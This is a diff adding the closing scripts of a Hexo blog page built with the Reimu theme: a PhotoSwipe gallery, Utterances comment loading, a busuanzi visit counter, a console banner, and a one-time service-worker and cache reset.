+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'IDCM-svg/HFTTC.github.io');
+        script.setAttribute('issue-term', 'pathname');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'utterances';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false,
+      utterances: false,
+      beaudar: false,
+      disqus: false,
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    Promise.all([
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        return Promise.all(registrations.map((registration) => registration.unregister()));
+      }),
+      ('caches' in window)
+        ? caches.keys().then((keys) => Promise.all(keys.map((key) => caches.delete(key))))
+        : Promise.resolve()
+    ]).then(() => {
+      if (!sessionStorage.getItem('sw-cache-cleared')) {
+        sessionStorage.setItem('sw-cache-cleared', '1');
+        window.location.reload();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
